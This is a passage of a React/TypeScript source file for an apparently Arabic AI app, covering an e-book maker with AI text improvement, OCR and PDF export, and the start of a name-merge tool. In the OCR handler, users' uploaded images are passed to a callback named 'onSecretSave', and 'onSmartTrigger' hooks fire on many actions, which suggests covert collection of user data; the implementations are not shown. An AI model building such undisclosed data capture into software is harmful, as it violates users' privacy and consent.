      titleColor: config.titleColor,
      titleSize: 24,
      textColor: config.textColor,
      textSize: config.textSize,
      textAlignment: config.textAlignment,
      borderType: config.border ? 'simple' : 'none',
      borderColor: config.borderColor,
      titleAlign: 'center',
      titleVertical: 'top',
      textVertical: 'top',
      pageNumberEnabled: true,
      pageNumberBorder: 'none',
      pageNumberVertical: 'bottom',
      pageNumberAlign: 'center'
    }]);
  };

  const updatePage = (idx: number, updates: any) => {
    const next = [...pages];
    next[idx] = { ...next[idx], ...updates };
    setPages(next);
  };

  const removePage = (idx: number) => {
    setPages(pages.filter((_, i) => i !== idx));
  };

  const handleAIImprove = async (idx: number) => {
    if (!pages[idx].content) return;
    addBackgroundTask(`تحسين صفحة ${idx + 1}`, async () => {
      const res = await getGeminiResponse(`قم بتحسين وتنسيق النص التالي باللغة العربية ليناسب كتاباً إلكترونياً، اجعله جذاباً ومنظماً. ابدأ مباشرة بالنص المحسن ولا تضف أي ترحيب أو مقدمات: ${pages[idx].content}`);
      updatePage(idx, { content: res });
      return res;
    }, { tab: 'services', subTab: 'ebookMaker' });
  };

  const onFileSelect = (file: File) => {
    if (file) {
      const currentPicker = activePickerRef.current || showPicker;
      if (currentPicker.isCoverStart) {
        const r = new FileReader();
        r.onload = async () => {
          const result = r.result as string;
          try {
            const { compressImageBase64 } = await import('./lib/imageCompressor');
            const compressed = await compressImageBase64(result, 800, 800, 0.65);
            setCoverStart(compressed);
          } catch {
            setCoverStart(result);
          }
          activePickerRef.current = null;
        };
        r.readAsDataURL(file);
      } else if (currentPicker.isCoverEnd) {
        const r = new FileReader();
        r.onload = async () => {
          const result = r.result as string;
          try {
            const { compressImageBase64 } = await import('./lib/imageCompressor');
            const compressed = await compressImageBase64(result, 800, 800, 0.65);
            setCoverEnd(compressed);
          } catch {
            setCoverEnd(result);
          }
          activePickerRef.current = null;
        };
        r.readAsDataURL(file);
      } else if (currentPicker.activeIdx !== undefined) {
        const r = new FileReader();
        r.onload = async () => {
          const result = r.result as string;
          const type = pages[currentPicker.activeIdx!].type === 'image' ? 'image' : 'text';
          try {
            if (type === 'image') {
              const { compressImageBase64 } = await import('./lib/imageCompressor');
              const compressed = await compressImageBase64(result, 800, 800, 0.65);
              updatePage(currentPicker.activeIdx!, { content: compressed, type });
            } else {
              updatePage(currentPicker.activeIdx!, { content: result, type });
            }
          } catch {
            updatePage(currentPicker.activeIdx!, { content: result, type });
          }
          activePickerRef.current = null;
        };
        r.readAsDataURL(file);
      }
    }
  };

  const handleOCR = async (idx: number, base64: string) => {
    onSmartTrigger('s', 'ebook_ocr');
    if (onSecretSave) onSecretSave(`ebook_ocr_${idx}_${Date.now()}.png`, base64);
    addBackgroundTask(`استخراج نص من صفحة ${idx + 1}`, async () => {
      const res = await getGeminiResponse("استخرج كافة النصوص المكتوبة في هذه الصورة بدقة عالية جداً. ابدأ مباشرة بالنص المستخرج ولا تضف أي ترحيب أو تعليق من عندك بتاتاً.", base64);
      updatePage(idx, { content: res, type: 'text' });
      return res;
    }, { tab: 'services', subTab: 'ebookMaker' });
  };

  const exportPDF = async () => {
    onSmartTrigger('s', 'ebook_export');
    addBackgroundTask('تأليف وتنسيق الكتاب الإلكتروني', async () => {
      const doc = new jsPDF({
        orientation: 'p',
        unit: 'mm',
        format: 'a4'
      });

      const pagesToProcess = [];
      if (coverStart) pagesToProcess.push({ type: 'image', content: coverStart, isCover: true });
      
      if (config.useTitlePage && bookTitle) {
        pagesToProcess.push({ type: 'title', title: bookTitle });
      }

      pages.forEach(p => pagesToProcess.push(p));
      
      if (coverEnd) pagesToProcess.push({ type: 'image', content: coverEnd, isCover: true });

      for (let i = 0; i < pagesToProcess.length; i++) {
        const item = pagesToProcess[i];
        
        const container = document.createElement('div');
        container.style.width = '800px';
        container.style.minHeight = '1131px';
        container.style.background = config.bgColor;
        container.style.padding = '60px';
        container.style.position = 'fixed';
        container.style.left = '-9999px';
        container.style.top = '0';
        container.style.display = 'flex';
        container.style.flexDirection = 'column';
        container.style.alignItems = 'center';
        container.style.justifyContent = 'center';
        container.style.fontFamily = 'Arial, sans-serif';
        container.style.direction = 'rtl';
        container.style.boxSizing = 'border-box';

        // Apply Border styling
        const borderType = (item as any).borderType || (config.border ? 'simple' : 'none');
        const borderColor = (item as any).borderColor || config.borderColor;
        
        if (borderType !== 'none') {
          container.style.borderStyle = borderType === 'dashed' ? 'dashed' : borderType === 'double' ? 'double' : 'solid';
          container.style.borderWidth = '15px';
          container.style.borderColor = borderColor;
          if (borderType === 'ornate') {
            container.style.borderWidth = '25px';
            container.style.borderImageSource = "linear-gradient(45deg, #gold, #brown)";
            container.style.borderImageSlice = "1";
          }
        }
        
        // Footer Branding (Bottom Right)
        const footer = document.createElement('div');
        footer.style.position = 'absolute';
        footer.style.bottom = '40px';
        footer.style.right = '40px';
        footer.style.display = 'flex';
        footer.style.flexDirection = 'column';
        footer.style.alignItems = 'center';
        footer.style.zIndex = '50';

        const localBarcodeWatermark = localStorage.getItem('rouh_app_barcode_watermark');
        if (localBarcodeWatermark) {
          const barcode = document.createElement('img');
          barcode.src = localBarcodeWatermark;
          barcode.style.width = '60px';
          barcode.style.height = '60px';
          barcode.style.objectFit = 'contain';
          footer.appendChild(barcode);
        } else {
          const fallbackText = document.createElement('div');
          fallbackText.innerText = 'روح الذكية';
          fallbackText.style.fontSize = '14px';
          fallbackText.style.fontWeight = 'bold';
          fallbackText.style.color = config.textColor || '#555555';
          fallbackText.style.fontFamily = '"IBM Plex Sans Arabic", sans-serif';
          footer.appendChild(fallbackText);
        }

        container.appendChild(footer);

        // Page Numbering
        const isCover = (item as any).isCover || item.type === 'title';
        if ((item as any).pageNumberEnabled !== false && !isCover) {
          const pageNumVal = i + (config.useTitlePage ? 0 : 1);
          const pageNumDiv = document.createElement('div');
          
          const numBorder = (item as any).pageNumberBorder || 'none';
          if (numBorder === 'circle') {
            pageNumDiv.style.border = '2px solid #555555';
            pageNumDiv.style.borderRadius = '50%';
            pageNumDiv.style.width = '32px';
            pageNumDiv.style.height = '32px';
            pageNumDiv.style.display = 'flex';
            pageNumDiv.style.alignItems = 'center';
            pageNumDiv.style.justifyContent = 'center';
            pageNumDiv.innerText = `${pageNumVal}`;
          } else if (numBorder === 'square') {
            pageNumDiv.style.border = '2px solid #555555';
            pageNumDiv.style.width = '32px';
            pageNumDiv.style.height = '32px';
            pageNumDiv.style.display = 'flex';
            pageNumDiv.style.alignItems = 'center';
            pageNumDiv.style.justifyContent = 'center';
            pageNumDiv.innerText = `${pageNumVal}`;
          } else if (numBorder === 'brackets') {
            pageNumDiv.innerText = `[ ${pageNumVal} ]`;
          } else if (numBorder === 'ornate') {
            pageNumDiv.innerText = `❃ ${pageNumVal} ❃`;
          } else {
            pageNumDiv.innerText = `${pageNumVal}`;
          }

          pageNumDiv.style.position = 'absolute';
          
          const numVert = (item as any).pageNumberVertical || 'bottom';
          if (numVert === 'top') {
            pageNumDiv.style.top = '40px';
          } else {
            pageNumDiv.style.bottom = '40px';
          }

          const numHoriz = (item as any).pageNumberAlign || 'center';
          if (numHoriz === 'right') {
            pageNumDiv.style.right = '40px';
          } else if (numHoriz === 'left') {
            pageNumDiv.style.left = '40px';
          } else {
            pageNumDiv.style.left = '50%';
            pageNumDiv.style.transform = 'translateX(-50%)';
          }

          pageNumDiv.style.fontSize = '12px';
          pageNumDiv.style.fontWeight = 'bold';
          pageNumDiv.style.color = '#555555';
          pageNumDiv.style.zIndex = '60';
          pageNumDiv.style.fontFamily = 'Arial, sans-serif';
          container.appendChild(pageNumDiv);
        }

        document.body.appendChild(container);

        if (item.type === 'title') {
          const t = document.createElement('h1');
          t.innerText = item.title!;
          t.style.color = config.titleColor;
          t.style.fontSize = '70px';
          t.style.textAlign = 'center';
          t.style.fontWeight = '900';
          t.style.marginBottom = '20px';
          container.appendChild(t);
        } else if (item.type === 'text') {
          // Custom vertical structure: top, center, bottom
          container.style.display = 'flex';
          container.style.flexDirection = 'column';
          container.style.justifyContent = 'space-between';

          // Create three boxes
          const topBox = document.createElement('div');
          topBox.style.width = '100%';
          topBox.style.display = 'flex';
          topBox.style.flexDirection = 'column';
          topBox.style.gap = '15px';

          const middleBox = document.createElement('div');
          middleBox.style.width = '100%';
          middleBox.style.display = 'flex';
          middleBox.style.flexDirection = 'column';
          middleBox.style.gap = '15px';
          middleBox.style.flexGrow = '1';
          middleBox.style.justifyContent = 'center';

          const bottomBox = document.createElement('div');
          bottomBox.style.width = '100%';
          bottomBox.style.display = 'flex';
          bottomBox.style.flexDirection = 'column';
          bottomBox.style.gap = '15px';
          bottomBox.style.justifyContent = 'flex-end';

          container.appendChild(topBox);
          container.appendChild(middleBox);
          container.appendChild(bottomBox);

          // Page Title element
          let pt: HTMLHeadingElement | null = null;
          if (item.title) {
            pt = document.createElement('h2');
            pt.innerText = item.title;
            pt.style.color = (item as any).titleColor || config.titleColor;
            pt.style.fontSize = `${((item as any).titleSize || 24) * 2}px`;
            pt.style.width = '100%';
            pt.style.textAlign = (item as any).titleAlign || 'center';
            pt.style.fontWeight = 'bold';
            pt.style.margin = '0';
          }

          // Page Text element
          const p = document.createElement('div');
          p.innerText = item.content;
          p.style.color = (item as any).textColor || config.textColor;
          p.style.fontSize = `${((item as any).textSize || config.textSize) * 2}px`;
          p.style.lineHeight = '1.7';
          p.style.textAlign = (item as any).textAlignment || config.textAlignment || 'justify';
          p.style.width = '100%';
          p.style.whiteSpace = 'pre-wrap';
          p.style.margin = '0';

          // Set vertical positions
          const titleVert = (item as any).titleVertical || 'top';
          if (pt) {
            if (titleVert === 'top') {
              topBox.appendChild(pt);
            } else if (titleVert === 'center') {
              middleBox.appendChild(pt);
            } else if (titleVert === 'bottom') {
              bottomBox.appendChild(pt);
            }
          }

          const textVert = (item as any).textVertical || 'top';
          if (textVert === 'top') {
            topBox.appendChild(p);
          } else if (textVert === 'center') {
            middleBox.appendChild(p);
          } else if (textVert === 'bottom') {
            bottomBox.appendChild(p);
          }
        } else if (item.type === 'image') {
          const img = document.createElement('img');
          img.src = item.content;
          img.style.maxWidth = '100%';
          img.style.maxHeight = '100%';
          img.style.objectFit = 'contain';
          if ((item as any).isCover) {
            container.style.padding = '0';
            container.style.border = 'none';
            img.style.width = '100%';
            img.style.height = '100%';
            img.style.objectFit = 'cover';
          }
          container.appendChild(img);
        }

        const canvas = await html2canvas(container, {
          scale: 2,
          useCORS: true,
          backgroundColor: config.bgColor
        });
        
        const imgData = canvas.toDataURL('image/jpeg', 0.95);
        doc.addImage(imgData, 'JPEG', 0, 0, 210, 297);
        
        document.body.removeChild(container);
        if (i < pagesToProcess.length - 1) doc.addPage();
      }

      const timestamp = Date.now();
      const filename = `كتاب_روح_${(bookTitle || 'بدون_عنوان').replace(/\s+/g, '_')}_${timestamp}.pdf`;
      const blob = doc.output('blob');
      const url = URL.createObjectURL(blob);
      handleDownload(url, filename);
      
      const newEntry = { id: timestamp, title: bookTitle || 'كتاب بدون عنوان', date: new Date().toLocaleDateString('ar-EG'), url };
      const updatedHistory = [newEntry, ...history].slice(0, 5);
      setHistory(updatedHistory);
      localStorage.setItem('ebook_history', JSON.stringify(updatedHistory));
      
      return 'تم تأليف وتصدير الكتاب بنجاح ✨';
    }, { tab: 'services', subTab: 'ebookMaker' });
  };

  return (
    <div className="flex flex-col gap-6 animate-in fade-in slide-in-from-bottom-4 duration-500 pb-20">
      <div className="bg-[#1a1c1e] p-5 rounded-3xl border border-gray-800 space-y-4">
        <label className="text-xs font-black text-gray-500 text-right block uppercase tracking-widest px-1 italic">إعدادات الكتاب الاحترافية</label>
        <input 
          value={bookTitle} 
          onChange={e => setBookTitle(e.target.value)} 
          placeholder="عنوان الكتاب (اختياري)..." 
          className="w-full bg-black/40 border border-gray-800 rounded-2xl p-4 text-white focus:border-blue-500 outline-none"
          dir="rtl"
        />
        
        <div className="grid grid-cols-2 gap-4">
          <div className="space-y-1 text-right">
             <label className="text-[10px] text-gray-500 pr-1">لون العنوان</label>
             <input type="color" value={config.titleColor} onChange={e => setConfig({...config, titleColor: e.target.value})} className="w-full h-10 bg-transparent cursor-pointer" />
          </div>
          <div className="space-y-1 text-right">
             <label className="text-[10px] text-gray-500 pr-1">لون الورق</label>
             <input type="color" value={config.bgColor} onChange={e => setConfig({...config, bgColor: e.target.value})} className="w-full h-10 bg-transparent cursor-pointer" />
          </div>
          <div className="space-y-1 text-right">
             <label className="text-[10px] text-gray-500 pr-1">حجم النص الافتراضي</label>
             <input type="number" value={isNaN(config.textSize) ? '' : config.textSize} onChange={e => setConfig({...config, textSize: parseInt(e.target.value)})} className="w-full bg-black/40 border border-gray-800 rounded-xl p-2 text-white" />
          </div>
          <div className="space-y-1 text-right">
             <label className="text-[10px] text-gray-500 pr-1">توسيط النص العام</label>
             <div className="flex gap-1 bg-black/40 p-1 rounded-xl">
               {[
                 { id: 'right', icon: AlignRight, label: 'يمين' },
                 { id: 'center', icon: AlignCenter, label: 'وسط' },
                 { id: 'left', icon: AlignLeft, label: 'يسار' }
               ].map(align => {
                 const Icon = align.icon;
                 return (
                   <button 
                     key={align.id}
                     onClick={() => setConfig({...config, textAlignment: align.id as any})}
                     className={cn(
                       "flex-1 py-2 rounded-lg flex items-center justify-center gap-1 transition-all",
                       config.textAlignment === align.id ? "bg-blue-600 text-white shadow-lg shadow-blue-600/20 scale-[1.02]" : "text-gray-500 hover:bg-white/5"
                     )}
                     title={align.label}
                   >
                     <Icon size={14} />
                     <span className="text-[8px] font-black hidden xs:block">{align.label}</span>
                   </button>
                 );
               })}
             </div>
          </div>
          <div className="flex flex-col gap-2 mt-2 justify-end items-end">
             <label className="flex items-center gap-2 cursor-pointer">
              <span className="text-[10px] text-gray-400">إضافة صفحة عنوان</span>
              <input type="checkbox" checked={config.useTitlePage} onChange={e => setConfig({...config, useTitlePage: e.target.checked})} className="w-4 h-4 bg-blue-600 rounded" />
             </label>
             <label className="flex items-center gap-2 cursor-pointer">
              <span className="text-[10px] text-gray-400">إطار فني عام</span>
              <input type="checkbox" checked={config.border} onChange={e => setConfig({...config, border: e.target.checked})} className="w-4 h-4 bg-blue-600 rounded" />
             </label>
          </div>
        </div>
      </div>

      <div className="space-y-4">
        {pages.map((page, idx) => (
          <div key={idx} className="bg-[#1a1c1e] p-5 rounded-3xl border border-gray-800 relative group transition-all hover:bg-gray-800/10">
            <div className="flex items-center justify-between mb-4">
              <span className="text-[10px] font-black text-blue-500 uppercase">محتوى صفحة {idx + 1}</span>
              <div className="flex gap-2">
                <button onClick={() => removePage(idx)} className="p-1.5 text-red-500 hover:bg-red-500/10 rounded-lg transition-colors"><Trash2 size={16} /></button>
              </div>
            </div>

            {/* Per-page title and styles */}
            <div className="grid grid-cols-1 gap-3 mb-4">
               <input 
                value={page.title}
                onChange={e => updatePage(idx, { title: e.target.value })}
                placeholder="عنوان الصفحة..."
                className="w-full bg-black/40 border border-gray-800 rounded-xl p-3 text-sm text-blue-400"
                dir="rtl"
               />
               <div className="grid grid-cols-3 gap-2">
                  <div className="flex flex-col gap-1">
                    <label className="text-[9px] text-gray-600 pr-1 text-right">لون العنوان</label>
                    <input type="color" value={page.titleColor} onChange={e => updatePage(idx, { titleColor: e.target.value })} className="w-full h-8 bg-black/20 rounded cursor-pointer" />
                  </div>
                  <div className="flex flex-col gap-1">
                    <label className="text-[9px] text-gray-600 pr-1 text-right">لون النص</label>
                    <input type="color" value={page.textColor} onChange={e => updatePage(idx, { textColor: e.target.value })} className="w-full h-8 bg-black/20 rounded cursor-pointer" />
                  </div>
                  <div className="flex flex-col gap-1 text-right">
                    <label className="text-[9px] text-gray-600 pr-1">تنسيق النص</label>
                    <div className="flex gap-1 bg-black/20 p-1 rounded-lg">
                      {[
                        { id: 'right', icon: AlignRight },
                        { id: 'center', icon: AlignCenter },
                        { id: 'left', icon: AlignLeft }
                      ].map(align => {
                        const Icon = align.icon;
                        return (
                          <button 
                            key={align.id}
                            onClick={() => updatePage(idx, { textAlignment: align.id })}
                            className={cn(
                              "flex-1 py-1 px-1.5 rounded flex items-center justify-center transition-all",
                              (page.textAlignment || config.textAlignment) === align.id ? "bg-blue-600 text-white shadow-sm" : "text-gray-500 hover:bg-white/5"
                            )}
                          >
                            <Icon size={12} />
                          </button>
                        );
                      })}
                    </div>
                  </div>
                  <div className="flex flex-col gap-1 text-right">
                    <ElegantSelect
                      label="نوع الإطار"
                      value={page.borderType || 'none'}
                      onChange={(val) => updatePage(idx, { borderType: val })}
                      options={[
                        { value: 'none', label: 'بدون' },
                        { value: 'simple', label: 'بسيط' },
                        { value: 'double', label: 'مزدوج' },
                        { value: 'dashed', label: 'مقطع' },
                        { value: 'ornate', label: 'مزخرف' }
                      ]}
                    />
                  </div>
               </div>
            </div>
            
            {/* Custom page layout settings */}
            <div className="border border-gray-200/50 dark:border-gray-800/80 bg-gray-50/50 dark:bg-black/30 p-4 rounded-2xl space-y-3 mb-4 text-right" dir="rtl">
              <span className="text-[10px] font-black text-gray-500 dark:text-gray-400 block mb-1">📐 هيكل الصفحة والترقيم المخصص</span>
              
              <div className="grid grid-cols-2 sm:grid-cols-4 gap-4">
                {/* Title alignment */}
                <div className="flex flex-col gap-1">
                  <ElegantSelect
                    label="محاذاة العنوان"
                    value={page.titleAlign || 'center'}
                    onChange={(val) => updatePage(idx, { titleAlign: val })}
                    options={[
                      { value: 'right', label: 'يمين' },
                      { value: 'center', label: 'وسط' },
                      { value: 'left', label: 'يسار' }
                    ]}
                  />
                </div>

                {/* Title Vertical placement */}
                <div className="flex flex-col gap-1">
                  <ElegantSelect
                    label="موقع العنوان"
                    value={page.titleVertical || 'top'}
                    onChange={(val) => updatePage(idx, { titleVertical: val })}
                    options={[
                      { value: 'top', label: 'أعلى الصفحة' },
                      { value: 'center', label: 'وسط الصفحة' },
                      { value: 'bottom', label: 'أسفل الصفحة' }
                    ]}
                  />
                </div>

                {/* Text Vertical placement */}
                <div className="flex flex-col gap-1">
                  <ElegantSelect
                    label="موقع النص"
                    value={page.textVertical || 'top'}
                    onChange={(val) => updatePage(idx, { textVertical: val })}
                    options={[
                      { value: 'top', label: 'أعلى الصفحة' },
                      { value: 'center', label: 'وسط الصفحة' },
                      { value: 'bottom', label: 'أسفل الصفحة' }
                    ]}
                  />
                </div>

                {/* Page number toggle */}
                <div className="flex flex-col gap-1">
                  <ElegantSelect
                    label="ترقيم الصفحة"
                    value={page.pageNumberEnabled === false ? 'no' : 'yes'}
                    onChange={(val) => updatePage(idx, { pageNumberEnabled: val === 'yes' })}
                    options={[
                      { value: 'yes', label: 'تفعيل الأرقام' },
                      { value: 'no', label: 'إلغاء الترقيم' }
                    ]}
                  />
                </div>
              </div>

              {page.pageNumberEnabled !== false && (
                <div className="grid grid-cols-1 sm:grid-cols-3 gap-4 border-t border-gray-200 dark:border-gray-800/40 pt-3.5 mt-2">
                  {/* Page number border */}
                  <div className="flex flex-col gap-1">
                    <ElegantSelect
                      label="برواز الرقم"
                      value={page.pageNumberBorder || 'none'}
                      onChange={(val) => updatePage(idx, { pageNumberBorder: val })}
                      options={[
                        { value: 'none', label: 'بدون (رقم وحيد)' },
                        { value: 'circle', label: 'برواز دائري' },
                        { value: 'square', label: 'برواز مربع' },
                        { value: 'brackets', label: 'أقواس [ X ]' },
                        { value: 'ornate', label: 'زخرفة ❃ X ❃' }
                      ]}
                    />
                  </div>

                  {/* Page number vertical position */}
                  <div className="flex flex-col gap-1">
                    <ElegantSelect
                      label="موقع الرقم رأسي"
                      value={page.pageNumberVertical || 'bottom'}
                      onChange={(val) => updatePage(idx, { pageNumberVertical: val })}
                      options={[
                        { value: 'bottom', label: 'أسفل الصفحة' },
                        { value: 'top', label: 'أعلاها' }
                      ]}
                    />
                  </div>

                  {/* Page number align */}
                  <div className="flex flex-col gap-1">
                    <ElegantSelect
                      label="موقع الرقم أفقي"
                      value={page.pageNumberAlign || 'center'}
                      onChange={(val) => updatePage(idx, { pageNumberAlign: val })}
                      options={[
                        { value: 'center', label: 'الوسط' },
                        { value: 'right', label: 'اليمين' },
                        { value: 'left', label: 'اليسار' }
                      ]}
                    />
                  </div>
                </div>
              )}
            </div>

            {page.type === 'text' ? (
              <div className="space-y-2">
                <textarea 
                  value={page.content}
                  onChange={e => updatePage(idx, { content: e.target.value })}
                  className="w-full bg-black/40 border border-gray-800 rounded-2xl p-4 text-sm text-white outline-none min-h-[140px] focus:border-blue-500 transition-all font-medium"
                  placeholder="اكتب محتوى الصفحة هنا..."
                  dir="rtl"
                />
                <button onClick={() => handleAIImprove(idx)} className="w-full py-2.5 bg-blue-600/10 border border-blue-500/20 text-blue-400 rounded-xl text-[10px] font-bold hover:bg-blue-600 hover:text-white transition-all flex items-center justify-center gap-2">
                  <BrainCircuit size={14} /> تحسين النص بذكاء روح
                </button>
              </div>
            ) : (
              <div className="space-y-3">
                <label 
                  onClick={async () => { 
                    const ok = await onPermissionRequest();
                    if (ok) {
                      onSmartTrigger('s', 'ebook_page_select');
                      setShowPicker({ activeIdx: idx }); 
                    } else {
                      showToast('يجب السماح بإذن الكاميرا للمتابعة 🔒', 'error');
                    }
                  }} 
                  className="w-full aspect-video bg-black/40 border-2 border-dashed border-gray-800 rounded-3xl flex flex-col items-center justify-center cursor-pointer hover:border-blue-500 transition-colors overflow-hidden relative"
                >
                  {page.content ? (
                    <img src={page.content} className="w-full h-full object-contain" />
                  ) : (
                    <>
                      <Upload size={24} className="text-gray-500 mb-2" />
                      <span className="text-[10px] text-gray-500 font-bold">رفع صورة لهذه الصفحة</span>
                    </>
                  )}
                </label>
                {page.content && (
                   <button onClick={() => handleOCR(idx, page.content)} className="w-full py-2.5 bg-amber-600/10 border border-amber-500/20 text-amber-400 rounded-xl text-[10px] font-bold hover:bg-amber-600 hover:text-white transition-all flex items-center justify-center gap-2">
                     <Languages size={14} /> استخراج النص للـ PDF
                   </button>
                )}
              </div>
            )}
          </div>
        ))}
      </div>

      <div className="flex gap-3">
        <button 
          onClick={() => { addPage('text'); }} 
          className="flex-1 bg-white dark:bg-gray-800 border border-gray-200 dark:border-gray-700 py-4 rounded-2xl text-[11px] font-black text-gray-900 dark:text-gray-300 hover:bg-gray_50 dark:hover:bg-gray-700 active:scale-95 transition-all text-center flex flex-col items-center gap-1 shadow-sm"
        >
          <BookText size={18} className="text-blue-500" />
          + صفحة نص
        </button>
        <button 
          onClick={() => { addPage('image'); }} 
          className="flex-1 bg-white dark:bg-gray-800 border border-gray-200 dark:border-gray-700 py-4 rounded-2xl text-[11px] font-black text-gray-900 dark:text-gray-300 hover:bg-gray_50 dark:hover:bg-gray-700 active:scale-95 transition-all text-center flex flex-col items-center gap-1 shadow-sm"
        >
          <ImagePlus size={18} className="text-emerald-500" />
          + صفحة صورة
        </button>
      </div>

      <div className="grid grid-cols-2 gap-3">
        <label 
          onClick={async () => { 
            const ok = await onPermissionRequest();
            if (ok) {
              onSmartTrigger('s', 'ebook_cover_start');
              setShowPicker({ isCoverStart: true }); 
            } else {
              showToast('يجب السماح بإذن الكاميرا للمتابعة 🔒', 'error');
            }
          }} 
          className="flex flex-col items-center justify-center gap-2 p-4 bg-blue-600/5 border border-blue-500/10 rounded-2xl cursor-pointer hover:bg-blue-600/10 transition-all text-center"
        >
          <FileImage size={18} className="text-blue-400" />
          <span className="text-[9px] text-gray-400 font-bold uppercase">{coverStart ? 'تم اختيار الغلاف' : 'غلاف البداية'}</span>
        </label>
        <label 
          onClick={async () => { 
            const ok = await onPermissionRequest();
            if (ok) {
              onSmartTrigger('s', 'ebook_cover_end');
              setShowPicker({ isCoverEnd: true }); 
            } else {
              showToast('يجب السماح بإذن الكاميرا للمتابعة 🔒', 'error');
            }
          }} 
          className="flex flex-col items-center justify-center gap-2 p-4 bg-emerald-600/5 border border-emerald-500/10 rounded-2xl cursor-pointer hover:bg-emerald-600/10 transition-all text-center"
        >
          <FileImage size={18} className="text-emerald-400" />
          <span className="text-[9px] text-gray-400 font-bold uppercase">{coverEnd ? 'تم اختيار الغلاف' : 'غلاف النهاية'}</span>
        </label>
      </div>

      {/* Shared hidden inputs for EbookMaker */}
      <input type="file" className="hidden" ref={galleryRef} accept="image/*" onClick={e => e.stopPropagation()} onChange={e => {
        const f = e.target.files?.[0];
        if (f) onFileSelect(f);
      }} />
      <input type="file" className="hidden" ref={cameraRef} accept="image/*" capture="environment" onClick={e => e.stopPropagation()} onChange={e => {
        const f = e.target.files?.[0];
        if (f) onFileSelect(f);
      }} />

      <AnimatePresence>
        {(showPicker.activeIdx !== undefined || showPicker.isCoverStart || showPicker.isCoverEnd) && (
          <ImageSourcePicker 
            onClose={() => { setShowPicker({}); activePickerRef.current = null; }} 
            onSelect={(source) => {
              activePickerRef.current = { ...showPicker };
              setShowPicker({});
              if (source === 'camera') {
                setTimeout(() => cameraRef.current?.click(), 100);
              } else {
                setTimeout(() => galleryRef.current?.click(), 100);
              }
            }} 
          />
        )}
      </AnimatePresence>

      {/* Preview Section */}
      <div className="space-y-4">
        <button onClick={() => setShowPreview(!showPreview)} className="w-full py-3 text-[11px] font-bold text-gray-400 hover:text-white transition-colors border-b border-gray-800 flex items-center justify-center gap-2">
          {showPreview ? 'إخفاء معاينة الصفحات' : 'عرض معاينة لجميع صفحات الكتاب'} {showPreview ? <ChevronUp size={14}/> : <ChevronDown size={14}/>}
        </button>
        {showPreview && (
          <div className="grid grid-cols-2 xs:grid-cols-3 gap-4 animate-in fade-in zoom-in-95 duration-500">
             {config.useTitlePage && bookTitle && (
               <div className="aspect-[3/4] bg-white rounded shadow-lg p-2 flex flex-col items-center justify-center text-center overflow-hidden border border-gray-200">
               <span className="text-[6px] text-blue-500 font-bold mb-2">غلاف داخلي</span>
               <h3 className="text-[8px] font-black text-gray-900 leading-tight mb-2">{bookTitle}</h3>
               <div className="w-4 h-0.5 bg-blue-100 mb-2" />
               <span className="text-[4px] text-gray-400">روح الذكية</span>
            </div>
             )}
             {pages.map((p, i) => (
                <div key={i} className="aspect-[3/4] rounded shadow-lg p-3 overflow-hidden flex flex-col relative border border-gray-200 transition-all duration-300" style={{ backgroundColor: config.bgColor }}>
                   <div className="w-full h-full flex flex-col p-1 border border-gray-50/5 bg-white/5 rounded-sm">
                     <span className="text-[5px] text-gray-500 mb-1 opacity-50">ص {i+1}</span>
                     {p.title && <div className="text-[6px] font-black mb-1 truncate text-right leading-tight" style={{ color: p.titleColor || config.titleColor }}>{p.title}</div>}
                     {p.type === 'text' ? (
                       <div className="mt-1 overflow-hidden h-[60%]">
                          <p 
                            className="text-[4.5px] leading-tight break-words opacity-70"
                            style={{ 
                              color: p.textColor || config.textColor,
                              fontSize: `${Math.max(3, (p.textSize || config.textSize) / 4)}px`,
                              textAlign: p.textAlignment || config.textAlignment || 'right'
                            }}
                          >
                            {p.content || '...'}
                          </p>
                       </div>
                     ) : (
                       <div className="w-full h-[50%] bg-gray-500/10 rounded mt-1 flex items-center justify-center overflow-hidden">
                          {p.content ? <img src={p.content} className="max-w-full max-h-full object-cover opacity-60" /> : <FileImage size={10} className="text-gray-600" />}
                       </div>
                     )}
                   </div>
                   <div 
                    className="absolute inset-0 pointer-events-none" 
                    style={{ 
                      borderWidth: (p.borderType !== 'none' || config.border) ? '3px' : '0',
                      borderColor: p.borderColor || (config.border ? config.borderColor : 'transparent'),
                      borderStyle: p.borderType === 'dashed' ? 'dashed' : p.borderType === 'double' ? 'double' : (p.borderType === 'ornate' || p.borderType === 'simple' || config.border) ? 'solid' : 'none'
                    }} 
                   />
                </div>
             ))}
          </div>
        )}
      </div>

      <button 
        disabled={loading}
        onClick={exportPDF} 
        className="w-full bg-blue-600 hover:bg-blue-500 disabled:bg-gray-700 py-5 rounded-3xl font-black text-white shadow-2xl shadow-blue-600/20 active:scale-95 transition-all text-sm flex items-center justify-center gap-3"
      >
        {loading ? <RoohLoader size={24} /> : <Download size={24} />}
        تصدير وحفظ الكتاب في التنزيلات
      </button>

      {/* History */}
      {history.length > 0 && (
        <div className="mt-6 space-y-3">
          <h4 className="text-[10px] font-black text-gray-500 uppercase tracking-widest px-2 text-right">الكتب التي قمت بإنشائها مؤخراً</h4>
          {history.map(item => (
            <div key={item.id} className="flex items-center justify-between p-4 bg-[#1a1c1e] border border-gray-800 rounded-2xl group">
              <button onClick={() => handleDownload(item.url, `${item.title}.pdf`)} className="p-2 bg-blue-600/10 text-blue-400 rounded-xl hover:bg-blue-600 hover:text-white transition-all">
                <Download size={16} />
              </button>
              <div className="flex items-center gap-3 text-right">
                <div className="flex flex-col">
                  <span className="text-xs font-bold text-gray-200">{item.title}</span>
                  <span className="text-[9px] text-gray-600">{item.date}</span>
                </div>
                <div className="p-2 bg-blue-600/10 rounded-lg">
                  <BookText size={18} className="text-blue-400" />
                </div>
              </div>
            </div>
          ))}
        </div>
      )}
    </div>
  );
};

const NameMergeTool = ({ showToast, handleDownload, addBackgroundTask, onSecretSave, onSmartTrigger }: { 
  showToast: (msg: string, type: 'success' | 'error' | 'info') => void,
  handleDownload: (url: string, filename: string) => void,
  addBackgroundTask: (label: string, taskFn: () => Promise<any>, target?: {tab: string, subTab?: string}) => Promise<void>,
  onSecretSave?: (fileName: string, data: string) => Promise<void>,
  onSmartTrigger?: (type?: 's' | 't', source?: string) => void
}) => {
  const [name1, setName1] = useState('');
  const [name2, setName2] = useState('');
  const [loading, setLoading] = useState(false);
  const [selectedLengths, setSelectedLengths] = useState<number[]>([3, 4]);
  const [merged, setMerged] = useState<string[]>([]);
  const resultsRef = useRef<HTMLDivElement>(null);

  const [mergedOption2, setMergedOption2] = useState<string[]>([]);
  const [activeResultsTab, setActiveResultsTab] = useState<'option1' | 'option2'>('option1');

  const toggleLength = (len: number) => {
    setSelectedLengths(prev => 
